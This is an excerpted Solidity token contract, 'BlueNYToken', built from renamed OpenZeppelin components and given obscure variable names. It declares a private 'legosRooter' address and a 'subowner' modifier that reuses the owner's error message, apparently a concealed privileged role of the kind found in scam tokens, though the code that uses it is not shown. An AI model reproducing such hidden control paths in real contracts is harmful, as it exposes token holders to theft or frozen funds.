...
/*
 * @dev Provides information about the current execution BlueNY20Burnable, including the
 ...
 */
abstract contract BlueNY20Burnable {
...
// File: @openzeppelin/contracts/access/BlueNY20Ownable.sol
 ...
 * the owner.
 */
abstract contract BlueNY20Ownable is BlueNY20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "BlueNY20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "BlueNY20Ownable: new owner is the zero address");
 ...
 * `SafeBlueNY` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
...
library SafeBlueNY {
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeBlueNY: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeBlueNY: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeBlueNY: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeBlueNY: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeBlueNY: modulo by zero");
  }
...
contract BlueNYToken is BlueNY20Burnable, BlueNY33, BlueNY20Ownable {
    
    using SafeBlueNY for uint256;
   ...
   address private legosRooter; 
    ...
    string public BlueNYtelegramcchannel = "https://t.me/BlueNY";
            function getBlueNYtelegramcchannel() public view returns (string memory) {
        return BlueNYtelegramcchannel;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {BlueNY33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "BlueNY20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {BlueNY33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {BlueNY33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {BlueNY33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "BlueNY33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {BlueNY33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "BlueNY33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "BlueNY33: transfer from the zero address");
        require(shippingto != address(0), "BlueNY33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "BlueNY33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "BlueNY33: approve from the zero address");
        require(transporteur != address(0), "BlueNY33: approve to the zero address");
